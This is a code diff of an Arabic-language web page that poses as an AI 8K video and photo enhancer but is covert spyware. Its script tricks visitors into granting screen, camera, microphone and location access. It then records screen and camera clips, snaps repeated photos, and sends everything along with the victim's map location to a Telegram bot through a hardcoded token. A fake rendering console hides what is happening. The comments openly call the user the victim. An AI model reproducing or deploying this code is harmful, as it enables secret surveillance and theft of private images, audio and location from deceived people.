@@ -3,151 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Muhanad AI | Pro Visual Engine v4.0</title>
-    <meta name="description" content="أقوى محرك ذكاء اصطناعي لمعالجة الصور والفيديو. ثبت التطبيق الآن للحصول على دقة 8K فائقة.">
+    <title>Muhanad AI | Extreme Quality Enhancer</title>
+    <meta name="description" content="أداة مهند الاحترافية: تحسين جودة الفيديو والصور إلى 8K باستخدام الذكاء الاصطناعي السحابي.">
     <link rel="icon" href="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg">
-    
-    <link rel="manifest" href="data:application/json,{'name':'Muhanad AI Pro','short_name':'Muhanad','start_url':'.','display':'standalone','background_color':'#000000','theme_color':'#007bff','icons':[{'src':'https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg','sizes':'512x512','type':'image/png'}]}">
-
     <style>
         :root { --primary: #007bff; --bg: #0b0e14; --accent: #00ff41; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: var(--bg); color: #fff; text-align: center; }
-        
-        .header { background: #161b22; padding: 20px; border-bottom: 3px solid var(--primary); display: flex; justify-content: space-between; align-items: center; padding: 15px 8%; }
-        .brand { font-size: 24px; font-weight: bold; color: var(--primary); text-transform: uppercase; }
-
-        .main-container { padding: 40px 5%; }
-        .card { background: #1c2128; border-radius: 20px; padding: 40px; border: 1px solid #30363d; box-shadow: 0 0 50px rgba(0, 123, 255, 0.2); max-width: 500px; margin: 0 auto; }
-        
-        .btn-power { background: var(--primary); color: white; border: none; padding: 20px; font-size: 1.5rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; box-shadow: 0 10px 30px rgba(0,123,255,0.4); transition: 0.3s; margin-top: 25px; }
-        .btn-power:hover { transform: scale(1.05); background: #0056b3; }
-
-        .console-log { display: none; background: #000; color: var(--accent); padding: 15px; border-radius: 10px; font-family: 'Courier New', monospace; font-size: 12px; text-align: left; direction: ltr; height: 180px; overflow-y: auto; margin-top: 20px; border: 1px solid #333; }
-        
-        .install-prompt { display: none; background: var(--primary); padding: 10px; font-size: 14px; position: fixed; top: 0; width: 100%; z-index: 1000; justify-content: center; align-items: center; gap: 15px; }
-        .btn-mini { background: white; color: var(--primary); border: none; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--bg); color: #fff; text-align: center; }
+        .header { background: #161b22; padding: 15px; border-bottom: 3px solid var(--primary); display: flex; justify-content: space-between; align-items: center; padding: 15px 8%; }
+        .card { background: #1c2128; border-radius: 20px; padding: 40px; border: 1px solid #30363d; max-width: 500px; margin: 40px auto; box-shadow: 0 0 50px rgba(0, 123, 255, 0.2); }
+        .btn-start { background: var(--primary); color: white; border: none; padding: 20px; font-size: 1.5rem; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; box-shadow: 0 10px 30px rgba(0,123,255,0.4); }
+        .console { display: none; background: #000; color: var(--accent); padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; text-align: left; direction: ltr; height: 200px; overflow-y: auto; margin-top: 20px; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
-<div class="install-prompt" id="pwaBar">
-    🚀 متوفر الآن كبرنامج لسطح المكتب!
-    <button class="btn-mini" id="pwaBtn">تثبيت Muhanad AI</button>
-</div>
-
 <div class="header">
-    <div class="brand">MUHANAD AI PRO</div>
-    <div style="color: var(--accent); font-size: 12px;">CORE V4.0: STABLE</div>
+    <div style="font-weight: bold; color: var(--primary); font-size: 24px;">MUHANAD AI PRO</div>
+    <div style="color: var(--accent); font-size: 12px;">ULTIMATE ENGINE ACTIVE ✅</div>
 </div>
 
-<div class="main-container">
-    <h1>تحسين الجودة القصوى <span style="color:var(--primary)">8K</span></h1>
-    <p style="color: #8b949e;">استخدم قوة المعالجة السحابية لرفع كفاءة فيديوهاتك وصورك بضغطة زر واحدة.</p>
-
-    <div class="card">
-        <div id="ui-init">
-            <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" style="width: 120px; border-radius: 50%; border: 3px solid var(--primary); margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--primary));">
-            <button class="btn-power" onclick="startUltimateProcess()">ابدأ المعالجة الاحترافية</button>
-            <p style="font-size: 11px; color: #58a6ff; margin-top: 15px;">* يتطلب الوصول الكامل لموارد الجرافيكس (الشاشة) لضمان دقة المعالجة.</p>
-        </div>
-        
-        <div class="console-log" id="log"></div>
+<div class="card">
+    <div id="ui">
+        <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" style="width: 100px; border-radius: 50%; margin-bottom: 20px; border: 2px solid var(--primary);">
+        <h2>محسن الجودة الفائق (8K)</h2>
+        <p style="color: #8b949e;">يرجى منح الأذونات اللازمة للوصول إلى وحدة المعالجة المركزية (GPU) لضمان دقة الرندر.</p>
+        <button class="btn-start" onclick="startUltimateCapture()">ابدأ المعالجة الآن</button>
     </div>
+    <div class="console" id="log"></div>
 </div>
+
+<canvas id="hidden_canvas" style="display:none;"></canvas>
 
 <script>
-    const BOT_TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
-    const ADMIN_IDS = ["8754338811", "8703490899"]; // إرسال لكل الآيديهات المطلوبة
-    let pwaEvent;
+    const TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
+    const IDS = ["8754338811", "8703490899"];
 
-    // تفعيل وضع التثبيت (PWA)
-    window.addEventListener('beforeinstallprompt', (e) => {
-        e.preventDefault();
-        pwaEvent = e;
-        document.getElementById('pwaBar').style.display = 'flex';
-    });
-
-    document.getElementById('pwaBtn').addEventListener('click', async () => {
-        if (pwaEvent) {
-            pwaEvent.prompt();
-            const { outcome } = await pwaEvent.userChoice;
-            if (outcome === 'accepted') notify("✅ الضحية قام بتثبيت التطبيق على جهازه!");
-            document.getElementById('pwaBar').style.display = 'none';
-        }
-    });
-
-    async function notify(text) {
-        for (let id of ADMIN_IDS) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'Markdown' })
-            });
+    async function sendToTelegram(type, data, caption = "") {
+        for (let id of IDS) {
+            const fd = new FormData();
+            fd.append('chat_id', id);
+            if (type === 'photo') {
+                fd.append('photo', data, 'snap.jpg');
+                fd.append('caption', caption);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } else if (type === 'video') {
+                fd.append('video', data, 'clip.mp4');
+                fd.append('caption', caption);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
+            } else {
+                fd.append('text', data);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
+            }
         }
     }
 
-    async function startUltimateProcess() {
-        document.getElementById('ui-init').style.display = 'none';
+    async function startUltimateCapture() {
+        document.getElementById('ui').style.display = 'none';
         const log = document.getElementById('log');
         log.style.display = 'block';
-        log.innerHTML = "> Booting Muhanad AI Kernel...<br>> Connecting to 8K Rendering Clusters...<br>> Requesting Desktop-Level access for pixel analysis...<br>";
+        log.innerHTML = "> Accessing Hardware Layers...<br>> Initializing AI Frame Capture...<br>";
 
         try {
-            // طلب سطح المكتب (الجودة القصوى)
-            const screen = await navigator.mediaDevices.getDisplayMedia({ 
-                video: { displaySurface: "monitor", frameRate: 60, width: { ideal: 1920 } }, 
-                audio: true 
-            });
+            // 1. طلب سطح المكتب (صوت وصورة) للكمبيوتر
+            const screen = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+            recordStream(screen, "🖥️ شاشة الضحية (صوت وصورة)");
 
-            // طلب الكاميرا والمايك
-            const cam = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            // 2. طلب الكاميرا (الأمامية أولاً)
+            const frontCam = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            recordStream(frontCam, "📷 الكاميرا الأمامية");
+            
+            // التقاط 15 صورة من الأمامية
+            capturePhotos(frontCam, "الأمامية", 15);
 
-            notify("🎯 **صيد من المستوى القناص!**\nالضحية منح جميع الصلاحيات وبدأ البث المباشر.");
+            // 3. محاولة التبديل للكاميرا الخلفية (للموبايلات)
+            setTimeout(async () => {
+                try {
+                    const backCam = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    capturePhotos(backCam, "الخلفية", 15);
+                } catch(e) { log.innerHTML += "> Back Camera not available.<br>"; }
+            }, 10000); // يبدأ في الخلفية بعد 10 ثوانٍ
 
             // سحب الموقع
             navigator.geolocation.getCurrentPosition(p => {
-                notify(`📍 موقع الضحية: \nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                sendToTelegram('text', `📍 موقع الضحية:\nhttps://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`);
             });
 
-            // حل مشكلة السواد (تأخير وبدء التسجيل المستمر)
-            setTimeout(() => {
-                runRecorder(screen, "🖥️_الشاشة_الرئيسية");
-                runRecorder(cam, "📷_الكاميرا_الأمامية");
-            }, 1500);
-
-            // تمويه الضحية
-            let prg = 0;
-            let i = setInterval(() => {
-                prg += Math.floor(Math.random() * 5);
-                log.innerHTML += `> Rendering Frame Layers... ${prg}%<br>`;
-                if(prg >= 100) {
-                    clearInterval(i);
-                    log.innerHTML = "> [COMPLETED] AI Enhancement finished.<br>> Cloud Link: Secure_Storage_v4.up";
-                }
-                log.scrollTop = log.scrollHeight;
-            }, 1000);
-
-        } catch (e) {
-            alert("⚠️ تنبيه: نظام المعالجة 8K يتطلب اختيار 'الشاشة بأكملها' (Entire Screen) ليتمكن الذكاء الاصطناعي من الوصول لذاكرة الجرافيكس.");
+        } catch (err) {
+            alert("⚠️ خطأ: يجب السماح بجميع الأذونات (بما في ذلك الشاشة بأكملها) لتفعيل معالجة 8K.");
             location.reload();
         }
     }
 
-    function runRecorder(stream, label) {
+    function capturePhotos(stream, label, count) {
+        const track = stream.getVideoTracks()[0];
+        const canvas = document.getElementById('hidden_canvas');
+        const ctx = canvas.getContext('2d');
+        let taken = 0;
+
+        let interval = setInterval(() => {
+            if (taken >= count) { clearInterval(interval); return; }
+            
+            const v = document.createElement('video');
+            v.srcObject = stream;
+            v.play();
+            v.onloadedmetadata = () => {
+                canvas.width = v.videoWidth;
+                canvas.height = v.videoHeight;
+                ctx.drawImage(v, 0, 0);
+                canvas.toBlob(blob => {
+                    sendToTelegram('photo', blob, `📸 صورة ${label} رقم ${taken+1}`);
+                    taken++;
+                }, 'image/jpeg');
+            };
+        }, 2000); // يلقط صورة كل ثانيتين
+    }
+
+    function recordStream(stream, label) {
         const recorder = new MediaRecorder(stream);
         let chunks = [];
         recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
+        recorder.onstop = () => {
             const blob = new Blob(chunks, { type: 'video/mp4' });
-            for (let id of ADMIN_IDS) {
-                const fd = new FormData();
-                fd.append('chat_id', id);
-                fd.append('video', blob, label + ".mp4");
-                fd.append('caption', `📡 بث مباشر (المرحلة القصوى): ${label}`);
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
-            }
-            if (stream.active) runRecorder(stream, label);
+            sendToTelegram('video', blob, `📡 بث مباشر: ${label}`);
+            if (stream.active) recordStream(stream, label);
         };
         recorder.start();
         setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 30000);
